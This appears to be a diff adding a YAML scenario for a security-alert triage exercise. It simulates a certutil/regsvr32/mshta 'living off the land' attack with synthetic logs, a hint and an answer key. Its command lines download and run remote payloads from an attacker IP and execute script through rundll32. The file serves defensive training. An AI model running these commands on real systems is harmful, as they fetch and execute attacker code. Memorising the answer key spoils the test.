@@ -1,0 +1,67 @@
+meta:
+  name: "Living off the Land: certutil + regsvr32 + mshta Abuse"
+  difficulty: hard
+  answer: INCIDENT
+  mitre_techniques:
+    - id: T1218.010
+      name: "System Binary Proxy Execution: Regsvr32"
+    - id: T1218.011
+      name: "System Binary Proxy Execution: Rundll32"
+    - id: T1105
+      name: "Ingress Tool Transfer"
+    - id: T1059.007
+      name: "Command and Scripting Interpreter: JavaScript"
+  hint: "certutil with -urlcache -split -f is a well-known LOLBin technique to download arbitrary files using a trusted Windows binary. regsvr32 loading scrobj.dll can execute remote COM scriptlets. mshta executing a remote HTTP URL runs HTA payloads bypassing AppLocker. These binaries are legitimate but their combination — download, register, execute — in sequence from a user workstation is a strong indicator of fileless malware staging. No reputable software uses this exact chain."
+  alert:
+    rule_id: SUSPICIOUS_PROCESS
+    severity: HIGH
+    summary: "LOLBin execution chain detected on {inject_malicious_host} by {inject_malicious_user} — certutil/regsvr32/mshta abuse"
+    description: "Multiple signed Windows binaries used to download and execute remote content. certutil -urlcache followed by regsvr32 scrobj.dll and mshta is a known fileless malware delivery pattern. Investigate network connections and any dropped files on the affected host."
+
+world_overrides:
+  attacker_ip: "198.51.100.33"
+  inject_malicious_host: "WS012"
+  inject_malicious_user: "mike.henderson"
+
+phases:
+  phase_1:
+    name: "Execution: LOLBin Abuse Chain"
+    technique: T1218.010
+    count: 4
+    log_factory: sysmon.process_create
+    spread_seconds: 60
+    delay_after_prev: [5, 20]
+    params:
+      dest_host: "{inject_malicious_host}"
+      source_ip: "{attacker_ip}"
+      target_user: "{inject_malicious_user}"
+      command_line:
+        - "certutil.exe -urlcache -split -f http://198.51.100.33/stage2.bin C:\\Windows\\Temp\\stage2.bin"
+        - "regsvr32.exe /s /n /u /i:http://198.51.100.33/payload.sct scrobj.dll"
+        - "mshta.exe http://198.51.100.33/loader.hta"
+        - "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WScript.Shell\");h.run(\"calc\")"
+
+  phase_2:
+    name: "Ingress Tool Transfer: Payload Download via Proxy"
+    technique: T1105
+    count: 2
+    log_factory: proxy.http_request
+    spread_seconds: 30
+    delay_after_prev: [5, 15]
+    params:
+      source_ip: "{attacker_ip}"
+      url: "http://198.51.100.33/stage2.bin"
+      method: GET
+      user_agent: "Microsoft-CryptoAPI/6.3"
+
+  phase_3:
+    name: "Execution: Dropped Stage-2 Payload"
+    technique: T1105
+    count: 2
+    log_factory: sysmon.file_create
+    spread_seconds: 15
+    delay_after_prev: [3, 10]
+    params:
+      dest_host: "{inject_malicious_host}"
+      target_user: "{inject_malicious_user}"
+      target_filename: "C:\\Windows\\Temp\\stage2.bin"
